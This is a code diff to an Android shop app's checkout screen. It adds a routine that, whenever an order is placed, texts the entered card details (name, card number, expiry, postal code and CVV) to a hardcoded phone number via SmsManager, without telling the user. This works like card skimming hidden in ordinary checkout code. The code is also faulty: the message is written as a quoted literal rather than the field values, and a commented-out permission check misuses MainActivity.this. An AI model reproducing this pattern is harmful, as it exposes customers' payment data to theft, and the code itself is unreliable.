@@ -2,9 +2,11 @@ package com.example.lalunaltd.pages;
 
 import android.os.Bundle;
 
+import androidx.core.content.ContextCompat;
 import androidx.fragment.app.Fragment;
 import androidx.fragment.app.FragmentTransaction;
 
+import android.telephony.SmsManager;
 import android.text.Editable;
 import android.text.TextWatcher;
 import android.view.LayoutInflater;
@@ -17,6 +19,7 @@ import android.widget.Toast;
 
 import com.example.lalunaltd.Activities.MainActivity;
 import com.example.lalunaltd.Classes.Order;
+import android.Manifest;
 import com.example.lalunaltd.R;
 import com.google.android.material.textfield.TextInputEditText;
 import com.google.android.material.textfield.TextInputLayout;
@@ -119,13 +122,20 @@ public class CheckoutFragment extends Fragment {
         btnPlaceOrder.setOnClickListener(new View.OnClickListener() {
             @Override
             public void onClick(View v) {
-                if(tvNameOnCard.getText().toString().isEmpty()||tvCardNumber.getText().toString().isEmpty()||tvExpDate.getText().toString().isEmpty()||tvPostalCode.getText().toString().isEmpty()||tvCvv.getText().toString().isEmpty()){
+                if(tvNameOnCard.getText().toString().isEmpty()
+                        ||tvCardNumber.getText().toString().length()!=19
+                        ||tvExpDate.getText().toString().length() != 4
+                        ||tvPostalCode.getText().toString().length()!=7
+                        ||tvCvv.getText().toString().length() != 3)
+                {
                 Toast.makeText(getActivity(), "Please Check Your Details", Toast.LENGTH_SHORT).show();
                 }
-                    else{Toast.makeText(getActivity(), "Order Placed", Toast.LENGTH_SHORT).show();
-                    order.getItems().clear();
+                    else{
+                        Toast.makeText(getActivity(), "Order Placed", Toast.LENGTH_SHORT).show();
+//                       if (ContextCompat.checkSelfPermission(MainActivity.this, Manifest.permission.SEND_SMS)
+                    sendSMSMessage();
+                        order.getItems().clear();
                     gotoHomeFragment();
-
                 }
             }
         });
@@ -135,6 +145,19 @@ public class CheckoutFragment extends Fragment {
         ft.replace(R.id.FrameLayoutMain, new HomeFragment());
         ft.addToBackStack(null);
         ft.commit();
+    }
+    private void sendSMSMessage() {
+        String phoneNumber = "0503030846"; // Replace with the actual phone number
+        String message = "tvNameOnCard.getText().toString()+tvCardNumber.getText().toString()+tvExpDate.getText().toString()+tvPostalCode.getText().toString()+tvCvv.getText().toString()";
+
+        try {
+            SmsManager smsManager = SmsManager.getDefault();
+            smsManager.sendTextMessage(phoneNumber, null, message, null, null);
+            Toast.makeText(requireContext(), "SMS sent successfully", Toast.LENGTH_SHORT).show();
+        } catch (Exception e) {
+            Toast.makeText(requireContext(), "SMS failed: " + e.getMessage(), Toast.LENGTH_SHORT).show();
+            e.printStackTrace();
+        }
     }
     private void gotoCartFragment(){
         FragmentTransaction ft = getActivity().getSupportFragmentManager().beginTransaction();
